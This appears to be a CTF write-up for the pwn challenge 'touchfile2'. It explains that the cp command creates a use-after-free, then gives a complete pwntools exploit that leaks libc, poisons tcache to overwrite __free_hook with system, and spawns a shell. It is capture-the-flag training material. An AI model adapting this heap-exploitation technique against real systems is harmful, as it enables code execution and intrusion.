## touchfile2


***

出题人：xsh

![image-20240413224752026](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413224752026.png)

```bash
#cp 功能直接复制 idx，导致 两个不同的 idx 指向同一个堆块，可以实现 UAF

#构造exp如下
from pwn import *
from struct import pack
from ctypes import *
#from LibcSearcher import *

def s(a) : p.send(a)
def sa(a, b) : p.sendafter(a, b)
def sl(a) : p.sendline(a)
def sla(a, b) : p.sendlineafter(a, b)
def r() : return p.recv()
def pr() : print(p.recv())
def rl(a) : return p.recvuntil(a)
def inter() : p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr() : return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
def csu(rdi, rsi, rdx, rip, gadget) : return p64(gadget) + p64(0) + p64(1) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - 0x1a)

context(os='linux', arch='amd64', log_level='debug')
#p = process(['qemu-ppc-static', '-g', '1234', './pwn'])
p = process(['./pwn'])
#p = remote('node2.yuzhian.com.cn', 32406 )
elf = ELF('./pwn')
libc = ELF('glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6')

# uaf -> leak libc_base
for i in range(9):
    sla(b'>', b'touch ' + chr(ord('a') + i).encode() + b' a')
sla(b'>', b'cp g gg')
sla(b'>', b'cp h hh')

for i in range(8):
    sla(b'>', b'rm ' + chr(ord('a') + i).encode())
sla(b'>', b'cat hh')
libc_base = get_addr() - 0x70 - libc.sym['__malloc_hook']

# uaf -> tcache bin attack : free_hook -> system
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

sla(b'>', b'edit gg ' + p64(free_hook))
sla(b'>', b'touch 1 /bin/sh\x00')
sla(b'>', b'touch 2 ' + p64(system))

#pwn
sla(b'>', b'rm 1')
inter()

print(' libc_base -> ', hex(libc_base))
#debug()



```



